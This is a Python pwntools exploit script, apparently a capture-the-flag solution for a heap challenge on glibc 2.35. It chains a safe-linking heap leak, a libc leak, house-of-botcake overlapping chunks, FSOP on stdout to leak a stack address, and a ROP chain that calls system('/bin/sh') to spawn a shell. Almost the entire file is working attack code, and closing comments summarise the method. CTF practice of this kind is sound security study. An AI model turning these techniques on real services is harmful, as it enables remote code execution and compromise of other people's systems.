#!/usr/bin/env python3
from pwn import *

elf = ELF('./vuln')
libc = ELF('./libc.so.6')
ld = ELF('./ld-2.35.so')
if args.LOCAL:
    p = elf.process()
    if args.GDB: 
        context.update(binary=elf, log_level='DEBUG')
        # gdb.attach(p, '''
        #     b *main+131
        #     b *main+143
        #     b *main+155
        # ''')
else:
    p = remote("", "")


def op_malloc(index, size, content):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"> ", str(index).encode())
    p.sendlineafter(b"> ", str(int(size)).encode())
    p.sendlineafter(b"content: ", content)
    return 

def op_free(index):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"> ", str(index).encode())
    return 

def op_view(index):
    p.sendlineafter(b"> ", b"3")
    p.sendlineafter(b"> ", str(index).encode())
    leak = p.recv(6).strip()
    return leak

# [0] leak heap 
op_malloc(0, 0x100, b"A"*8)
op_free(0)
leak = op_view(0)
key = u64(leak.ljust(8, b"\x00")) 
heap_base = key << 12
log.info("Heap base address: " + hex(heap_base))

# [1] leak libc
for i in range(7):
    op_malloc(i, 0x100, b"A"*8)

op_malloc(7, 0x100, b"B"*8)
op_malloc(8, 0x100, b"C"*8)
op_malloc(9, 0x10, b"/bin/sh\x00")

for i in range(7):
    op_free(i)

op_free(8)
op_free(7)
op_malloc(6, 0x100, b"E" * 8) # pop 6 out t-cache, slot for 8
op_free(8) # put victim 8 in t-cache
leak = op_view(7).ljust(8, b"\x00")
libc.address = u64(leak) - 0x219ce0
environ = libc.address + 0x221200
stdout = libc.address + 0x21a780
log.info("LIBC base address:   " + hex(libc.address))
log.info("system address:      " + hex(libc.symbols['system']))
log.info("environ:             " + hex(environ))
log.info("stdout:              " + hex(stdout))

# [2] house-of-botcake => leak stack address use FSOP
payload = b"A" * 0x108 + p64(0x111) + p64(key ^ (stdout)) 
op_malloc(0, 0x120, payload)          
op_malloc(1, 0x100, b"A"*8)
# fp->_flags = (fp->_flags & ~(_IO_NO_WRITES)) | _IO_CURRENTLY_PUTTING | _IO_IS_APPENDING.
# f->_IO_write_ptr = fp->_IO_write_end = f->_IO_buf_end = &environ + 8.
# fp->_IO_write_base = &environ
payload = b""
payload += p64(0xfbad1800)      # _flags
payload += p64(environ)*3       # _IO_read_*
payload += p64(environ)         # _IO_write_base
payload += p64(environ + 0x8)*2 # _IO_write_ptr + _IO_write_end
payload += p64(environ + 8)     # _IO_buf_base
payload += p64(environ + 8)     # _IO_buf_end
op_malloc(2, 0x100, payload)
stack_addr = u64((p.recvline().strip()).ljust(8, b"\x00"))
rsp = stack_addr - 0x128
log.info("rsp stack address:      " + hex(rsp))

# [3] again house-of-botcake => write in stack and ROP
op_free(1)
op_free(0)
ret_op_malloc = rsp - 8
payload = b"A" * 0x108 + p64(0x111) + p64(key ^ (ret_op_malloc - 8)) 
op_malloc(0, 0x120, payload)          
op_malloc(1, 0x100, b"A"*8)
prdi_ret = libc.address + 0x000000000002a3e5 # : pop rdi ; ret
ret = libc.address + 0x0000000000029cd6      # : ret
rop = b"A" * 8 + p64(ret) + p64(prdi_ret) + p64(next(libc.search(b'/bin/sh'))) + p64(libc.symbols["system"])
op_malloc(2, 0x100, rop)


p.interactive()

# https://nasm.re/posts/catastrophe/#house-of-botcake
# Leak heap address + defeating safe linking by printing the first freeâ€™d chunk in the tcache.
# House of botcake to op_malloc overlapping chunks and get arbitrary write
# FSOP on stdout to leak environ and then ROP over the stack.